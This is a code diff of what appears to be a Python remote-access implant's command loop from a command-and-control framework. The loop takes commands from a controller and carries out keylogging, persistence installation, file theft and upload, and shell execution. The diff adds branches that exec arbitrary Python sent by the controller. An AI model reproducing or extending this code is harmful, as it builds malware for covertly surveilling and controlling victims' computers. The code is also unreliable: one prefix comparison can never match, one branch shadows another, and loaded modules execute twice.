@@ -144,25 +144,75 @@ while(True):
         split = returncmd.split("!d-3dion@LD!-d")
 
         for cmd in split:
-          if "$sleeptime" in cmd:
+          if cmd[:10] == "$sleeptime":
             timer = int(cmd.replace("$sleeptime = ",""))
-          elif "download-file" in cmd:  
+          elif cmd[:13] == "download-file":  
             fname = cmd.replace("download-file ","")
             returnval = dfile(fname) 
-          elif "upload-file" in cmd:  
+          elif cmd[:11] == "upload-file":  
             fullparams = cmd.replace("upload-file ","")
             params = fullparams.split(":")
             returnval = ufile(params[1],params[0]) 
-          elif "install-persistence" in cmd:  
+          elif cmd[:19] == "install-persistence":  
             returnval = persist() 
-          elif "get-keystrokes" in cmd:  
+          elif cmd[:12] == "get-keystrokes":  
             returnval = keylog()
-          elif "remove-persistence" in cmd:  
+          elif cmd[:18] == "remove-persistence":  
             returnval = remove_persist() 
-          elif cmd == "startanotherimplant":   
+          elif cmd[:19] == "startanotherimplant":   
             returnval = sai(delfile=True)
-          elif "startanotherimplant-keepfile" in cmd:   
+          elif cmd[:28] == "startanotherimplant-keepfile":
             returnval = sai()  
+          elif cmd[:10] == "loadmodule":
+            module = cmd.replace("loadmodule","")
+            exec(module)
+            try:
+              import sys
+              import StringIO
+              import contextlib
+              
+              @contextlib.contextmanager
+              def stdoutIO(stdout=None):
+                old = sys.stdout
+                if stdout is None:
+                  stdout = StringIO.StringIO()
+                sys.stdout = stdout
+                yield stdout
+                sys.stdout = old
+
+              with stdoutIO() as s:
+                exec module
+              if s.getvalue():
+                returnval = s.getvalue()
+              else:
+                returnval = "Module loaded"
+            except Exception as e:
+              returnval = "Error with source file: %%s" %% e
+            
+          elif cmd[:6] == "python":
+            module = cmd.replace("python ","")            
+            try:
+              import sys
+              import StringIO
+              import contextlib
+              
+              @contextlib.contextmanager
+              def stdoutIO(stdout=None):
+                old = sys.stdout
+                if stdout is None:
+                  stdout = StringIO.StringIO()
+                sys.stdout = stdout
+                yield stdout
+                sys.stdout = old
+
+              with stdoutIO() as s:
+                exec module
+              
+              returnval = s.getvalue()
+
+            except Exception as e:
+              returnval = "Error with source file: %%s" %% e
+
           else:
             try:
               returnval = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
